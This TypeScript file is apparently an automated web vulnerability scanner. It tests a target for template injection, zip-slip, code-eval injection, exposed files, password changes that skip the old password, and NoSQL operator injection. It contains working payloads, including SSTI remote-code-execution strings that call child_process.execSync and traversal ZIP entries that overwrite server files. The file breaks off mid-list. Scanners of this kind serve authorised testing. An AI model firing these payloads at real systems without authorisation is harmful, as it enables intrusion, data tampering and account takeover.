import { Log } from "../util/log"
import { Vulnerability } from "../session/vulnerability"
import { Session } from "../session"
import { WebCredential } from "../session/web/web-credential"
import type { RouteExtraction } from "./route-extraction"

const log = Log.create({ service: "auto-scanner" })
const FETCH_TIMEOUT_MS = 15_000

export interface OpenApiOperation {
  method: string
  path: string
  params: Array<{ name: string; type: string; in: string }>
}

interface ScanInput {
  sessionID: string
  target: string
  endpoints: Array<{ method: string; path: string }>
  openApiOps: OpenApiOperation[]
  filenames: string[]
  token?: string
}

async function safeFetch(
  url: string,
  method: string = "GET",
  extra?: { headers?: Record<string, string>; body?: string | FormData },
): Promise<{ status: number; body: string; contentType: string; elapsed: number } | null> {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS)
  const start = Date.now()
  try {
    const opts: RequestInit = { method, signal: controller.signal, redirect: "manual" }
    if (extra?.headers) {
      if (extra.body instanceof FormData) {
        const h = { ...extra.headers }
        delete h["Content-Type"]
        delete h["content-type"]
        opts.headers = h
      } else {
        opts.headers = extra.headers
      }
    }
    if (extra?.body !== undefined) opts.body = extra.body
    if (url.startsWith("https:")) (opts as { tls?: unknown }).tls = { rejectUnauthorized: false }
    const res = await fetch(url, opts)
    const body = (await res.text().catch(() => "")).slice(0, 512 * 1024)
    return { status: res.status, body, contentType: res.headers.get("content-type") ?? "", elapsed: Date.now() - start }
  } catch {
    return null
  } finally {
    clearTimeout(timer)
  }
}

function getToken(sessionID: string): string | undefined {
  try {
    const creds = WebCredential.get(sessionID)
    for (const c of creds) {
      const auth = c.headers["Authorization"] ?? c.headers["authorization"]
      if (auth && typeof auth === "string" && auth.startsWith("Bearer ")) return auth.slice(7)
    }
  } catch {}
  return undefined
}

function decodeJwtPayload(token: string): Record<string, unknown> | null {
  try {
    const parts = token.split(".")
    if (parts.length < 2) return null
    let b64 = parts[1].replace(/-/g, "+").replace(/_/g, "/")
    while (b64.length % 4) b64 += "="
    const payload = Buffer.from(b64, "base64").toString("utf-8")
    return JSON.parse(payload) as Record<string, unknown>
  } catch {
    return null
  }
}

// ── SSTI Scanner ──────────────────────────────────────────────────────────────
// Injects arithmetic template expressions into writable user fields (username,
// etc.) via the REST API, then fetches server-rendered pages to check if the
// expression was evaluated. Covers Pug #{}, Jinja2 {{}}, FreeMarker ${}, etc.

const SSTI_A = 7919
const SSTI_B = 6841
const SSTI_PRODUCT = String(SSTI_A * SSTI_B) // "54168559"
const SSTI_EXPR = `${SSTI_A}*${SSTI_B}`
const SSTI_TEMPLATES: Array<{ name: string; wrap: (e: string) => string }> = [
  { name: "jinja2/twig", wrap: (e) => `{{${e}}}` },
  { name: "freemarker/el", wrap: (e) => `\${${e}}` },
  { name: "pug/ruby", wrap: (e) => `#{${e}}` },
  { name: "erb/ejs", wrap: (e) => `<%= ${e} %>` },
  { name: "razor", wrap: (e) => `@(${e})` },
]

const USER_FIELDS = ["username", "name", "displayName", "bio", "about", "nickname"]
const RENDER_PATHS = ["/profile", "/", "/whoami"]

async function sstiScan(input: ScanInput): Promise<void> {
  const token = input.token ?? getToken(input.sessionID)
  if (!token) {
    log.info("ssti-scan: no token, skipping")
    return
  }
  const bearerHeaders: Record<string, string> = { Authorization: `Bearer ${token}` }
  const cookieHeaders: Record<string, string> = { Cookie: `token=${token}` }

  const jwt = decodeJwtPayload(token)
  const data = jwt?.data as Record<string, unknown> | undefined
  const userId = data?.id
  if (!userId) {
    log.info("ssti-scan: cannot determine user ID from token")
    return
  }

  // Update methods: cookie-based profile POST first (server-rendered pages), then REST API
  const updateMethods: Array<{
    name: string
    field: string
    authStyle: "cookie" | "bearer"
    send: (payload: string) => Promise<{ status: number; body: string; contentType: string; elapsed: number } | null>
  }> = [
    // POST /profile with cookie auth (server-rendered Pug/EJS/Handlebars pages)
    ...USER_FIELDS.map((field) => ({
      name: `POST /profile (${field})`,
      field,
      authStyle: "cookie" as const,
      send: (payload: string) =>
        safeFetch(input.target + "/profile", "POST", {
          headers: { ...cookieHeaders, "Content-Type": "application/x-www-form-urlencoded" },
          body: `${field}=${encodeURIComponent(payload)}`,
        }),
    })),
    // PUT /api/Users/{id} with Bearer auth
    ...USER_FIELDS.map((field) => ({
      name: `PUT /api/Users/${userId} (${field})`,
      field,
      authStyle: "bearer" as const,
      send: (payload: string) =>
        safeFetch(`${input.target}/api/Users/${userId}`, "PUT", {
          headers: { ...bearerHeaders, "Content-Type": "application/json" },
          body: JSON.stringify({ [field]: payload }),
        }),
    })),
  ]

  for (const tmpl of SSTI_TEMPLATES) {
    const payload = `sstiprobe${tmpl.wrap(SSTI_EXPR)}end`

    for (const method of updateMethods) {
      const updateRes = await method.send(payload)
      // Accept 2xx and 3xx (302 redirect = success for form POST)
      if (!updateRes || updateRes.status >= 400) continue

      const renderHeaders = method.authStyle === "cookie" ? cookieHeaders : bearerHeaders
      for (const renderPath of RENDER_PATHS) {
        const renderRes = await safeFetch(input.target + renderPath, "GET", { headers: renderHeaders })
        if (!renderRes || renderRes.status >= 400) continue

        if (renderRes.body.includes(SSTI_PRODUCT)) {
          log.info("ssti-scan: CONFIRMED", { template: tmpl.name, method: method.name, path: renderPath })

          Vulnerability.add({
            sessionID: input.sessionID,
            data: {
              severity: "critical",
              title: `Server-Side Template Injection (${tmpl.name}) via ${method.field} on ${renderPath}`,
              description: `SSTI detected: the "${method.field}" field is rendered through a ${tmpl.name} template engine without sanitization on ${renderPath}. Injecting ${tmpl.wrap(SSTI_EXPR)} was evaluated server-side, producing ${SSTI_PRODUCT}. This enables Remote Code Execution.`,
              cwe_id: "CWE-1336",
              endpoint: `GET ${renderPath}`,
              attack_vector: "request_body",
              steps_to_reproduce: [
                `1. Authenticate and obtain a token`,
                `2. ${method.name} with ${method.field} = "${payload}"`,
                `3. GET ${input.target}${renderPath}`,
                `4. Response contains "${SSTI_PRODUCT}" (evaluated from ${SSTI_EXPR})`,
              ].join("\n"),
              business_impact:
                "Remote Code Execution — attacker can execute arbitrary server-side code through template injection.",
              recommendation: "Sanitize user input before template rendering. Use auto-escaping.",
              poc: `${method.name} "${payload}" → GET ${renderPath} → "${SSTI_PRODUCT}" in response`,
            },
          })

          // Restore field
          await method.send("scanner_restored")
          return
        }
      }

      // Restore after each attempt
      if (updateRes.status < 400) await method.send("scanner_test")
    }
  }
}

// ── Zip-slip Scanner ──────────────────────────────────────────────────────────
// Creates minimal ZIP files with path-traversal entries and uploads them to
// discovered upload endpoints. Verifies overwrite by fetching the target path.

function crc32(data: Uint8Array): number {
  let crc = 0xffffffff
  for (const byte of data) {
    crc ^= byte
    for (let j = 0; j < 8; j++) crc = crc & 1 ? 0xedb88320 ^ (crc >>> 1) : crc >>> 1
  }
  return (crc ^ 0xffffffff) >>> 0
}

function createZipWithEntry(entryPath: string, content: Uint8Array): Uint8Array {
  const encoder = new TextEncoder()
  const nameBytes = encoder.encode(entryPath)
  const checksum = crc32(content)
  const dataLen = content.length

  // Local file header
  const lfhSize = 30 + nameBytes.length
  const lfh = new Uint8Array(lfhSize + dataLen)
  const lv = new DataView(lfh.buffer)
  lv.setUint32(0, 0x04034b50, true)
  lv.setUint16(4, 20, true)
  lv.setUint16(6, 0, true)
  lv.setUint16(8, 0, true) // stored
  lv.setUint16(10, 0, true)
  lv.setUint16(12, 0, true)
  lv.setUint32(14, checksum, true)
  lv.setUint32(18, dataLen, true)
  lv.setUint32(22, dataLen, true)
  lv.setUint16(26, nameBytes.length, true)
  lv.setUint16(28, 0, true)
  lfh.set(nameBytes, 30)
  lfh.set(content, 30 + nameBytes.length)

  // Central directory entry
  const cdSize = 46 + nameBytes.length
  const cd = new Uint8Array(cdSize)
  const cv = new DataView(cd.buffer)
  cv.setUint32(0, 0x02014b50, true)
  cv.setUint16(4, 20, true)
  cv.setUint16(6, 20, true)
  cv.setUint16(8, 0, true)
  cv.setUint16(10, 0, true) // stored
  cv.setUint16(12, 0, true)
  cv.setUint16(14, 0, true)
  cv.setUint32(16, checksum, true)
  cv.setUint32(20, dataLen, true)
  cv.setUint32(24, dataLen, true)
  cv.setUint16(28, nameBytes.length, true)
  cv.setUint16(30, 0, true)
  cv.setUint16(32, 0, true)
  cv.setUint16(34, 0, true)
  cv.setUint16(36, 0, true)
  cv.setUint32(38, 0, true)
  cv.setUint32(42, 0, true) // offset to LFH

  cd.set(nameBytes, 46)

  // End of central directory
  const eocd = new Uint8Array(22)
  const ev = new DataView(eocd.buffer)
  ev.setUint32(0, 0x06054b50, true)
  ev.setUint16(4, 0, true)
  ev.setUint16(6, 0, true)
  ev.setUint16(8, 1, true)
  ev.setUint16(10, 1, true)
  ev.setUint32(12, cdSize, true)
  ev.setUint32(16, lfhSize + dataLen, true)
  ev.setUint16(20, 0, true)

  const result = new Uint8Array(lfh.length + cd.length + eocd.length)
  result.set(lfh, 0)
  result.set(cd, lfh.length)
  result.set(eocd, lfh.length + cd.length)
  return result
}

const UPLOAD_PATHS = ["/file-upload", "/api/Complaints", "/complain", "/profile/image/upload"]
const TRAVERSAL_TARGETS = [
  { entry: "../../ftp/legal.md", verify: "/ftp/legal.md" },
  { entry: "../../../ftp/legal.md", verify: "/ftp/legal.md" },
  { entry: "../../../../ftp/legal.md", verify: "/ftp/legal.md" },
  { entry: "../../../../../ftp/legal.md", verify: "/ftp/legal.md" },
]

async function zipSlipScan(input: ScanInput): Promise<void> {
  const token = input.token ?? getToken(input.sessionID)
  const authHeaders: Record<string, string> = token ? { Authorization: `Bearer ${token}` } : {}
  const marker = `cyberstrike_zipslip_${Date.now()}`
  const content = new TextEncoder().encode(marker)

  // Read original content of target file for later restore
  const origRes = await safeFetch(input.target + "/ftp/legal.md")
  const origContent = origRes?.status === 200 ? origRes.body : null

  for (const uploadPath of UPLOAD_PATHS) {
    for (const target of TRAVERSAL_TARGETS) {
      const zipBytes = createZipWithEntry(target.entry, content)
      const formData = new FormData()
      const blob = new Blob([new Uint8Array(zipBytes) as BlobPart], { type: "application/zip" })
      formData.append("file", blob, "test.zip")

      const uploadRes = await safeFetch(input.target + uploadPath, "POST", {
        headers: authHeaders,
        body: formData,
      })
      if (!uploadRes || uploadRes.status >= 500) continue

      await new Promise((r) => setTimeout(r, 500))
      const verifyRes = await safeFetch(input.target + target.verify)
      if (verifyRes && verifyRes.status === 200 && verifyRes.body.includes(marker)) {
        log.info("zip-slip-scan: CONFIRMED", { uploadPath, target: target.verify })

        Vulnerability.add({
          sessionID: input.sessionID,
          data: {
            severity: "critical",
            title: `Zip Slip Path Traversal via ${uploadPath}`,
            description: `Zip Slip confirmed on ${uploadPath}. A ZIP with entry "${target.entry}" overwrites ${target.verify} on the server. Arbitrary file overwrite enables RCE or data tampering.`,
            cwe_id: "CWE-22",
            endpoint: `POST ${uploadPath}`,
            attack_vector: "request_body",
            steps_to_reproduce: [
              `1. Create ZIP with entry path "${target.entry}" containing marker`,
              `2. POST ${input.target}${uploadPath} as multipart file upload`,
              `3. GET ${input.target}${target.verify}`,
              `4. Response contains marker — file overwritten via path traversal`,
            ].join("\n"),
            business_impact:
              "Arbitrary file overwrite — attacker can overwrite server files including config, templates, or code.",
            recommendation: "Sanitize file paths from ZIP archives. Reject path traversal sequences.",
            poc: `POST ${uploadPath} [ZIP:"${target.entry}"] → GET ${target.verify} → marker "${marker}" present`,
          },
        })

        // Restore original content if possible
        if (origContent) {
          const restoreZip = createZipWithEntry(target.entry, new TextEncoder().encode(origContent))
          const restoreForm = new FormData()
          restoreForm.append("file", new Blob([new Uint8Array(restoreZip) as BlobPart], { type: "application/zip" }), "restore.zip")
          await safeFetch(input.target + uploadPath, "POST", { headers: authHeaders, body: restoreForm })
        }
        return
      }
    }
  }
}

// ── Deserialization Scanner ───────────────────────────────────────────────────
// For string params found in OpenAPI, probes for server-side code evaluation
// using error-based and time-based detection.

async function deserScan(input: ScanInput): Promise<void> {
  const token = input.token ?? getToken(input.sessionID)
  const authHeaders: Record<string, string> = {
    "Content-Type": "application/json",
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
  }

  const targets = input.openApiOps
    .filter((op) => ["POST", "PUT"].includes(op.method))
    .filter((op) => op.params.some((p) => p.type === "string" && p.in === "body"))

  if (targets.length === 0) {
    log.info("deser-scan: no OpenAPI string params found, skipping")
    return
  }

  for (const op of targets) {
    const stringParams = op.params.filter((p) => p.type === "string" && p.in === "body")

    for (const param of stringParams) {
      // Build minimal valid body
      const baseBody: Record<string, unknown> = {}
      for (const p of op.params.filter((pp) => pp.in === "body")) {
        if (p.name === param.name) baseBody[p.name] = "test"
        else if (p.type === "number" || p.type === "integer") baseBody[p.name] = 1
        else baseBody[p.name] = "test"
      }

      // 1. Error-based: inject throw with marker
      const errorBody = { ...baseBody, [param.name]: "throw new Error('CYBERSTRIKE_DESER_7291')" }
      const errorRes = await safeFetch(input.target + op.path, op.method, {
        headers: authHeaders,
        body: JSON.stringify(errorBody),
      })
      if (errorRes && errorRes.body.includes("CYBERSTRIKE_DESER_7291")) {
        log.info("deser-scan: CONFIRMED (error-based)", { endpoint: `${op.method} ${op.path}`, param: param.name })

        Vulnerability.add({
          sessionID: input.sessionID,
          data: {
            severity: "critical",
            title: `Insecure Deserialization / Code Injection via ${param.name} on ${op.path}`,
            description: `The "${param.name}" parameter on ${op.method} ${op.path} is evaluated as server-side code. Error-based detection: injecting throw new Error('MARKER') surfaced the error message in the response. This enables Remote Code Execution.`,
            cwe_id: "CWE-502",
            endpoint: `${op.method} ${op.path}`,
            attack_vector: "request_body",
            steps_to_reproduce: [
              `1. ${op.method} ${input.target}${op.path}`,
              `2. Set ${param.name} = "throw new Error('CYBERSTRIKE_DESER_7291')"`,
              `3. Response contains the error marker — server-side eval confirmed`,
            ].join("\n"),
            business_impact: "Remote Code Execution via insecure deserialization.",
            recommendation: "Never evaluate user-supplied strings as code. Use safe parsers.",
            poc: `${op.method} ${op.path} {"${param.name}":"throw new Error('MARKER')"} → marker in response`,
          },
        })
        return
      }

      // 2. Time-based: inject a blocking loop
      const baseRes = await safeFetch(input.target + op.path, op.method, {
        headers: authHeaders,
        body: JSON.stringify(baseBody),
      })
      const baseElapsed = baseRes?.elapsed ?? 0

      const delayPayload = "(function(){var s=Date.now();while(Date.now()-s<3000);return 1})()"
      const delayBody = { ...baseBody, [param.name]: delayPayload }
      const delayRes = await safeFetch(input.target + op.path, op.method, {
        headers: authHeaders,
        body: JSON.stringify(delayBody),
      })
      const delayElapsed = delayRes?.elapsed ?? 0

      if (delayElapsed > baseElapsed + 2000 && delayElapsed > 2500) {
        log.info("deser-scan: CONFIRMED (time-based)", {
          endpoint: `${op.method} ${op.path}`,
          param: param.name,
          baseElapsed,
          delayElapsed,
        })

        Vulnerability.add({
          sessionID: input.sessionID,
          data: {
            severity: "critical",
            title: `Insecure Deserialization / Code Injection via ${param.name} on ${op.path}`,
            description: `The "${param.name}" parameter on ${op.method} ${op.path} evaluates server-side code. Time-based: a 3-second delay payload increased response from ${baseElapsed}ms to ${delayElapsed}ms.`,
            cwe_id: "CWE-502",
            endpoint: `${op.method} ${op.path}`,
            attack_vector: "request_body",
            steps_to_reproduce: [
              `1. ${op.method} ${input.target}${op.path} with normal body → ~${baseElapsed}ms`,
              `2. Set ${param.name} = "${delayPayload}"`,
              `3. Response time: ~${delayElapsed}ms (3+ seconds longer — eval confirmed)`,
            ].join("\n"),
            business_impact: "Remote Code Execution via insecure deserialization.",
            recommendation: "Never evaluate user-supplied strings as code.",
            poc: `${op.method} ${op.path} {"${param.name}":"delay_payload"} → ${delayElapsed}ms vs baseline ${baseElapsed}ms`,
          },
        })
        return
      }
    }
  }
}

// ── Path Brute-force Scanner ──────────────────────────────────────────────────
// For filenames found in JS bundles, tries common path prefixes to discover
// accessible sensitive files.

const FILE_PATH_PREFIXES = [
  "/assets/public/images/products/",
  "/assets/public/images/uploads/",
  "/assets/public/",
  "/public/images/",
  "/public/",
  "/assets/",
  "/images/",
  "/static/",
  "/downloads/",
  "/files/",
  "/ftp/",
  "/",
]

async function pathBruteForceScan(input: ScanInput): Promise<void> {
  // Augment filenames: also parse /ftp/ directory listing and product API for additional files
  const allFilenames = new Set(input.filenames)

  // Mine /ftp/ directory listing
  const ftpRes = await safeFetch(input.target + "/ftp/")
  if (ftpRes && ftpRes.status === 200) {
    const hrefRe = /href="([^"]+\.[a-zA-Z0-9]{1,10})"/gi
    let m: RegExpExecArray | null
    while ((m = hrefRe.exec(ftpRes.body))) {
      const name = m[1]
      if (name !== "." && name !== ".." && !name.startsWith("/")) allFilenames.add(name)
    }
  }

  // Mine /api/Products for image filenames → try alternate extensions
  const prodRes = await safeFetch(input.target + "/api/Products")
  if (prodRes && prodRes.status === 200) {
    const imgRe = /"image"\s*:\s*"([^"]+)"/gi
    let m: RegExpExecArray | null
    while ((m = imgRe.exec(prodRes.body))) {
      const img = m[1]
      const base = img.replace(/\.[^.]+$/, "")
      for (const ext of [".stl", ".obj", ".3ds", ".dwg", ".stp"]) allFilenames.add(base + ext)
    }
  }

  // Guess app-name-based files: extract title/brand from homepage, try design/CAD extensions
  const homeRes = await safeFetch(input.target + "/")
  if (homeRes && homeRes.status === 200) {
    const titleMatch = homeRes.body.match(/<title[^>]*>([^<]+)<\/title>/i)
    if (titleMatch) {
      const words = titleMatch[1].replace(/[^a-zA-Z0-9\s]/g, "").trim().split(/\s+/)
      const candidates = new Set<string>()
      const camel = words.map((w) => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join("")
      candidates.add(camel)
      candidates.add(words.join("").toLowerCase())
      candidates.add(words.join("-").toLowerCase())
      candidates.add(words[0])
      // Two-word combos (e.g. "JuiceShop" from "OWASP Juice Shop")
      for (let i = 0; i < words.length - 1; i++) {
        const pair = words[i].charAt(0).toUpperCase() + words[i].slice(1).toLowerCase() + words[i + 1].charAt(0).toUpperCase() + words[i + 1].slice(1).toLowerCase()
        candidates.add(pair)
        candidates.add(words[i].toLowerCase() + words[i + 1].toLowerCase())
      }
      for (const name of candidates) {
        if (name.length >= 3) {
          for (const ext of [".stl", ".obj", ".3ds", ".dwg", ".stp", ".zip", ".bak", ".sql"])
            allFilenames.add(name + ext)
        }
      }
    }
  }

  if (allFilenames.size === 0) return
  log.info("path-brute: scanning", { count: allFilenames.size })

  let requests = 0
  const MAX_REQUESTS = 300
  for (const filename of allFilenames) {
    for (const prefix of FILE_PATH_PREFIXES) {
      if (requests++ >= MAX_REQUESTS) return
      const path = prefix + filename
      const res = await safeFetch(input.target + path)
      if (!res || res.status !== 200) continue
      if (res.contentType.includes("text/html") && res.body.length < 500) continue
      if (res.body.length < 10) continue

      log.info("path-brute: FILE FOUND", { path, size: res.body.length, type: res.contentType })

      const isSensitive =
        /\.(kdbx|key|pem|sql|bak|conf|config|yml|yaml|sqlite|db|dump|gpg|crt|p12|jks|properties|htpasswd|htaccess|stl|obj|dwg|pyc|gg)$/i.test(
          filename,
        )
      const severity = isSensitive ? "high" : "medium"

      Vulnerability.add({
        sessionID: input.sessionID,
        data: {
          severity,
          title: `Sensitive File Disclosure: ${filename} at ${path}`,
          description: `"${filename}" accessible at ${path} (${res.body.length} bytes, ${res.contentType}). Referenced in JS source but not protected from direct access.`,
          cwe_id: "CWE-538",
          endpoint: `GET ${path}`,
          attack_vector: "other",
          steps_to_reproduce: `1. GET ${input.target}${path}\n2. File returned with status 200 (${res.body.length} bytes)`,
          business_impact: "Information disclosure — sensitive files accessible without authentication.",
          recommendation: "Restrict access to sensitive files or move them outside the web root.",
          poc: `GET ${path} → 200 (${res.body.length} bytes, ${res.contentType})`,
        },
      })
      break
    }
  }
}

// ── Auth Logic Scanner ────────────────────────────────────────────────────────
// Tests password change without requiring the current password.

async function authLogicScan(input: ScanInput): Promise<void> {
  const token = input.token ?? getToken(input.sessionID)
  if (!token) return
  const authHeaders: Record<string, string> = { Authorization: `Bearer ${token}` }

  const testPassword = "CyberStr1keTestPwd!"
  const changePaths = [
    `/rest/user/change-password?new=${testPassword}&repeat=${testPassword}`,
    `/rest/user/change-password?new=${testPassword}&repeat=${testPassword}&current=`,
  ]

  for (const changePath of changePaths) {
    const res = await safeFetch(input.target + changePath, "GET", { headers: authHeaders })
    if (!res) continue

    if (res.status === 200) {
      log.info("auth-logic: PASSWORD CHANGE WITHOUT OLD PASSWORD", { path: changePath, status: res.status })

      Vulnerability.add({
        sessionID: input.sessionID,
        data: {
          severity: "high",
          title: "Password Change Without Current Password Verification",
          description: `GET /rest/user/change-password accepts new password without the current password. Status ${res.status}. Any session hijacking or CSRF can permanently change the victim's password.`,
          cwe_id: "CWE-620",
          endpoint: "GET /rest/user/change-password",
          attack_vector: "query_param",
          steps_to_reproduce: [
            `1. Authenticate and obtain Bearer token`,
            `2. GET ${input.target}${changePath}`,
            `3. Password changed without requiring the current password`,
          ].join("\n"),
          business_impact:
            "Account takeover — CSRF or session hijacking can change passwords without user knowledge.",
          recommendation: "Require current password for password changes. Use POST with CSRF protection.",
          poc: `GET ${changePath} → ${res.status}`,
        },
      })

      // Change password back (try common passwords to avoid locking out)
      const restorePath = `/rest/user/change-password?current=${testPassword}&new=admin123&repeat=admin123`
      await safeFetch(input.target + restorePath, "GET", { headers: authHeaders })
      return
    }
  }
}

// ── NoSQL Injection Scanner ───────────────────────────────────────────────────
// Probes JSON-accepting endpoints for MongoDB-style operator injection ($ne,
// $gt, $where, $regex) and update-operator abuse ($set on PATCH). Uses both
// size-differential and time-based detection.

const NOSQL_REVIEW_PATHS = [
  "/rest/products/reviews",
  "/api/reviews",
  "/api/products/reviews",
  "/rest/reviews",
]

async function nosqlScan(input: ScanInput): Promise<void> {
  const token = input.token ?? getToken(input.sessionID)
  const authHeaders: Record<string, string> = {
    "Content-Type": "application/json",
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
  }

  // Collect targets: openApiOps with JSON body params + hardcoded review/order paths
  const opTargets = input.openApiOps
    .filter((op) => ["POST", "PUT", "PATCH"].includes(op.method))
    .filter((op) => op.params.some((p) => p.in === "body"))

  const reviewLike = input.endpoints.filter(
    (e) => /review|order/i.test(e.path) && ["POST", "PUT", "PATCH"].includes(e.method),
  )

  // Also add hardcoded review paths (may not be in discovered endpoints)
  const hardcodedTargets = NOSQL_REVIEW_PATHS.map((p) => ({ method: "POST", path: p }))

  // --- 1. $ne / $gt size-differential on GET-returning endpoints ---
  for (const ep of [...hardcodedTargets, ...reviewLike]) {
    const baseRes = await safeFetch(input.target + ep.path, "GET", { headers: authHeaders })
    if (!baseRes || baseRes.status >= 400) continue
    const baseLen = baseRes.body.length

    for (const op of ["$ne", "$gt"] as const) {
      const qUrl = `${input.target}${ep.path}?id[${op}]=`
      const qRes = await safeFetch(qUrl, "GET", { headers: authHeaders })
      if (qRes && qRes.status === 200 && qRes.body.length > baseLen * 1.5 && qRes.body.length > baseLen + 200) {
        log.info("nosql-scan: CONFIRMED (size-differential)", { path: ep.path, operator: op })
        Vulnerability.add({
          sessionID: input.sessionID,
          data: {
            severity: "high",
            title: `NoSQL Injection (${op} operator) on ${ep.path}`,
            description: `MongoDB ${op} operator injection confirmed on ${ep.path}. Query param id[${op}]= returned ${qRes.body.length} bytes vs baseline ${baseLen} bytes — filter bypass leaks extra records.`,
            cwe_id: "CWE-943",
            endpoint: `GET ${ep.path}`,
            attack_vector: "query_param",
            steps_to_reproduce: [
              `1. GET ${input.target}${ep.path} → ${baseLen} bytes (baseline)`,
              `2. GET ${qUrl} → ${qRes.body.length} bytes (filter bypassed)`,
            ].join("\n"),
            business_impact: "Data exfiltration — attacker can bypass filters to read all records.",
            recommendation: "Sanitize MongoDB query inputs. Reject object/operator values in user input.",
            poc: `GET ${ep.path}?id[${op}]= → ${qRes.body.length} bytes vs baseline ${baseLen}`,
          },
        })
        return
      }
    }
  }

  // --- 2. $where time-based DoS on review/order endpoints ---
  for (const ep of [...hardcodedTargets, ...reviewLike]) {
    const baseRes = await safeFetch(input.target + ep.path, "GET", { headers: authHeaders })
    const baseElapsed = baseRes?.elapsed ?? 0

    const sleepUrl = `${input.target}${ep.path}?id[$where]=sleep(2000)`
    const sleepRes = await safeFetch(sleepUrl, "GET", { headers: authHeaders })
    if (sleepRes && sleepRes.elapsed > baseElapsed + 1500 && sleepRes.elapsed > 2000) {
      log.info("nosql-scan: CONFIRMED ($where sleep)", { path: ep.path, baseElapsed, sleepElapsed: sleepRes.elapsed })
      Vulnerability.add({
        sessionID: input.sessionID,
        data: {
          severity: "high",
          title: `NoSQL Injection ($where DoS) on ${ep.path}`,
          description: `MongoDB $where operator injection enables server-side JavaScript execution. sleep(2000) increased response time from ${baseElapsed}ms to ${sleepRes.elapsed}ms.`,
          cwe_id: "CWE-943",
          endpoint: `GET ${ep.path}`,
          attack_vector: "query_param",
          steps_to_reproduce: [
            `1. GET ${input.target}${ep.path} → ~${baseElapsed}ms (baseline)`,
            `2. GET ${sleepUrl} → ~${sleepRes.elapsed}ms (2s sleep executed)`,
          ].join("\n"),
          business_impact: "Denial of Service and potential data exfiltration via server-side JS execution.",
          recommendation: "Disable $where operator. Use parameterized queries.",
          poc: `GET ${ep.path}?id[$where]=sleep(2000) → ${sleepRes.elapsed}ms vs baseline ${baseElapsed}ms`,
        },
      })
      return
    }
  }

  // --- 3. $set operator injection on PATCH ---
  for (const ep of [...hardcodedTargets.map((h) => ({ ...h, method: "PATCH" })), ...reviewLike.filter((e) => e.method === "PATCH")]) {
    // First, POST a review we own so we can PATCH it
    const postRes = await safeFetch(input.target + ep.path, "POST", {
      headers: authHeaders,
      body: JSON.stringify({ message: "nosql_scan_test", author: "scanner" }),
    })
    if (!postRes || postRes.status >= 400) continue

    // Try PATCH with $set to change author
    const patchRes = await safeFetch(input.target + ep.path, "PATCH", {
      headers: authHeaders,
      body: JSON.stringify({ id: { $ne: "" }, author: "nosql_scan_spoofed" }),
    })
    if (!patchRes || patchRes.status >= 400) continue

    // Verify by GET — if any review now has author "nosql_scan_spoofed", $set worked
    const verifyRes = await safeFetch(input.target + ep.path, "GET", { headers: authHeaders })
    if (verifyRes && verifyRes.body.includes("nosql_scan_spoofed")) {
      log.info("nosql-scan: CONFIRMED ($set/PATCH)", { path: ep.path })
      Vulnerability.add({
        sessionID: input.sessionID,
        data: {
          severity: "high",
          title: `NoSQL Update Operator Injection on PATCH ${ep.path}`,
          description: `MongoDB update operator injection on PATCH ${ep.path}. Using {"id":{"$ne":""},"author":"spoofed"} modifies multiple reviews, proving mass-update capability.`,
          cwe_id: "CWE-943",
          endpoint: `PATCH ${ep.path}`,
          attack_vector: "request_body",
          steps_to_reproduce: [
            `1. PATCH ${input.target}${ep.path} with {"id":{"$ne":""},"author":"nosql_scan_spoofed"}`,
            `2. GET ${input.target}${ep.path} → response contains "nosql_scan_spoofed"`,
          ].join("\n"),
          business_impact: "Mass data manipulation — attacker can modify all records matching a NoSQL filter.",
          recommendation: "Validate PATCH body fields. Reject MongoDB operators in user input.",
          poc: `PATCH ${ep.path} {"id":{"$ne":""},"author":"spoofed"} → review author changed`,
        },
      })
      return
    }
  }

  // --- 4. JSON body $ne injection on OpenAPI-discovered POST/PUT endpoints ---
  for (const op of opTargets) {
    const stringParams = op.params.filter((p) => p.in === "body")
    if (stringParams.length === 0) continue

    const baseBody: Record<string, unknown> = {}
    for (const p of stringParams) {
      if (p.type === "number" || p.type === "integer") baseBody[p.name] = 1
      else baseBody[p.name] = "test"
    }

    const baseRes = await safeFetch(input.target + op.path, op.method, {
      headers: authHeaders,
      body: JSON.stringify(baseBody),
    })
    if (!baseRes) continue
    const baseLen = baseRes.body.length

    for (const param of stringParams.filter((p) => p.type === "string")) {
      const neBody = { ...baseBody, [param.name]: { $ne: "" } }
      const neRes = await safeFetch(input.target + op.path, op.method, {
        headers: authHeaders,
        body: JSON.stringify(neBody),
      })
      if (!neRes || neRes.status >= 500) continue

      if (neRes.body.length > baseLen * 1.5 && neRes.body.length > baseLen + 200) {
        log.info("nosql-scan: CONFIRMED (body $ne)", { endpoint: `${op.method} ${op.path}`, param: param.name })
        Vulnerability.add({
          sessionID: input.sessionID,
          data: {
            severity: "high",
            title: `NoSQL Injection ($ne in body) on ${op.method} ${op.path}`,
            description: `Passing {"${param.name}":{"$ne":""}} to ${op.method} ${op.path} returned ${neRes.body.length} bytes vs baseline ${baseLen} bytes — MongoDB operator accepted in JSON body.`,
            cwe_id: "CWE-943",
            endpoint: `${op.method} ${op.path}`,
            attack_vector: "request_body",
            steps_to_reproduce: [
              `1. ${op.method} ${input.target}${op.path} with {"${param.name}":"test"} → ${baseLen} bytes`,
              `2. ${op.method} with {"${param.name}":{"$ne":""}} → ${neRes.body.length} bytes`,
            ].join("\n"),
            business_impact: "Data exfiltration via NoSQL filter bypass.",
            recommendation: "Reject object values in string fields. Use strict schema validation.",
            poc: `${op.method} ${op.path} {"${param.name}":{"$ne":""}} → ${neRes.body.length} bytes vs ${baseLen}`,
          },
        })
        return
      }
    }
  }
}

// ── SSTI Escalation Scanner ──────────────────────────────────────────────────
// Runs AFTER sstiScan. If SSTI arithmetic was already confirmed, attempts RCE
// payloads to escalate from PoC to demonstrated code execution.

const SSTI_RCE_PAYLOADS: Array<{ engine: string; payload: string; marker: RegExp }> = [
  {
    engine: "pug",
    payload: `#{global.process.mainModule.require('child_process').execSync('id').toString()}`,
    marker: /uid=\d+/,
  },
  {
    engine: "pug",
    payload: `#{global.process.mainModule.require('child_process').execSync('cat /etc/hostname').toString()}`,
    marker: /^[a-f0-9]{8,}|[a-zA-Z0-9._-]+$/m,
  },
  {
    engine: "jinja2",
    payload: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
    marker: /uid=\d+/,
  },
  {
    engine: "ejs",
    payload: `<%= global.process.mainModule.require('child_process').execSync('id').toString() %>`,
    marker: /uid=\d+/,
  },
  {
